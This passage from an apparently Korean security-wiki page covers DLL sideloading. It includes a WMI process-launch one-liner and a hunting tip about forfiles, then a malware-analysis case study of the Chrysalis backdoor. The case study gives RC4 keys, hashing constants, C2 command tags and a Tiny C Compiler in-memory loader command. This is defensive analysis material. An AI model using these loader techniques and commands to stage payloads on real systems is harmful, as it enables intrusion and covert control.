Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 로컬 DLL을 우선하는 바이너리(e.g., `intelbq.exe`, `nearby_share.exe`)와 함께 동작한다; 페이로드(e.g., Remcos)는 신뢰된 이름으로 실행된다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 등장하는 `forfiles`를 탐지 경보하라; 관리자 스크립트 밖에서는 드물다.


## 사례 연구: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침투는 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 전달했으며, 이는 DLL sideload와 완전한 인메모리 페이로드들을 스테이지했다.

공격 흐름
- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 생성하고 이를 **HIDDEN**으로 표시한 다음 이름이 바뀐 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 그리고 암호화된 블롭 `BluetoothService`를 드롭하고 EXE를 실행한다.
- 호스트 EXE는 `log.dll`을 임포트하고 `LogInit`/`LogWrite`를 호출한다. `LogInit`은 블롭을 메모리 매핑(mmap)으로 로드한다; `LogWrite`는 custom LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 키 재료는 이전 해시에서 유도)을 사용해 이를 복호화하고, 버퍼를 평문 쉘코드로 덮어쓴 뒤 임시를 해제하고 그 위치로 점프한다.
- IAT를 회피하기 위해 로더는 export 이름을 해싱하여 API를 해결한다( **FNV-1a basis 0x811C9DC5 + prime 0x1000193** ), 이어서 Murmur 스타일의 avalanche(**0x85EBCA6B**)를 적용하고 솔트된 타겟 해시와 비교한다.

Main shellcode (Chrysalis)
- 키 `gQ2JR&9;`로 add/XOR/sub을 다섯 번 반복해 PE 유사 메인 모듈을 복호화한 다음 동적으로 `Kernel32.dll` → `GetProcAddress`를 로드해 임포트 해결을 완료한다.
- 런타임에 문자별 비트 회전/XOR 변환으로 DLL 이름 문자열을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드한다.
- 두 번째 리졸버는 **PEB → InMemoryOrderModuleList**를 순회하고 각 export 테이블을 4바이트 블록 단위로 Murmur 스타일 믹싱으로 파싱하며, 해시를 찾지 못할 때만 `GetProcAddress`로 폴백한다.

Embedded configuration & C2
- 구성은 드롭된 `BluetoothService` 파일 내부 **offset 0x30808**(크기 **0x980**)에 존재하며 키 `qwhvb^435h&*7`로 RC4 복호화되어 C2 URL 및 User-Agent를 드러낸다.
- 비콘은 점(.)으로 구분된 호스트 프로파일을 구성하고 태그 `4Q`를 앞에 붙인 뒤 HTTPS로 `HttpSendRequestA`를 호출하기 전에 키 `vAuig34%^325hGV`로 RC4 암호화한다. 응답은 RC4 복호화되어 태그 스위치로 분기된다(`4T` 셸, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 제거, `4` 드라이브/파일 열거 + 청크 전송 등).
- 실행 모드는 CLI 인수로 분기된다: 인수가 없으면 설치 지속성(service/Run 키)으로 `-i`를 가리키도록 설치; `-i`는 자신을 `-k`와 함께 재실행; `-k`는 설치를 건너뛰고 페이로드를 실행한다.

Alternate loader observed
- 동일한 침투는 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, 그 옆에 `libtcc.dll`이 있었다. 공격자가 제공한 C 소스는 쉘코드를 임베드해 컴파일되어 PE 없이 디스크에 기록하지 않고 인메모리에서 실행되었다. 재현 예:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반 compile-and-run stage는 런타임에 `Wininet.dll`을 임포트하고 하드코딩된 URL에서 second-stage shellcode를 불러와 컴파일러 실행을 가장하는 유연한 loader를 제공했습니다.

## 참고자료

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
